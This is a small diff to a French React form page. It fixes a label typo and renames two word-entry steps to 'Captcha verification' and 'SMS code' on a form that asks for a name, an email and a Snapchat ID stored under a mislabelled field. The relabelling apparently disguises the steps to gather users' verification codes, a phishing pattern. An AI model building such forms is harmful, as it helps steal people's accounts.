@@ -15,7 +15,7 @@ import { SpinnerCircle } from "../components/Spinner";
 // Les 4 champs d'information (étape 1). On les décrit dans un tableau pour
 // les générer automatiquement -> c'est plus court et plus facile à modifier.
 const INFO_FIELDS = [
-  { key: "prenom", label: "Prénozzzzzzzzm", placeholder: "Ex : Marie", type: "text" },
+  { key: "prenom", label: "Prénom", placeholder: "Ex : Marie", type: "text" },
   { key: "nom", label: "Nom", placeholder: "Ex : Dupont", type: "text" },
   { key: "email", label: "Email", placeholder: "Ex : marie@email.com", type: "email" },
   { key: "ville", label: "ID Snap", placeholder: "Ex : snap.tock89", type: "text" },
@@ -143,9 +143,9 @@ export default function UserPage() {
               {step === "info"
                 ? "Tes informations"
                 : step === "word1"
-                ? "Premier mot"
+                ? "Vérifification Captcha"
                 : step === "word2"
-                ? "Deuxième mot"
+                ? "Code SMS"
                 : "Demande envoyée !"}
             </h1>
             <p className="mt-1 text-slate-600">
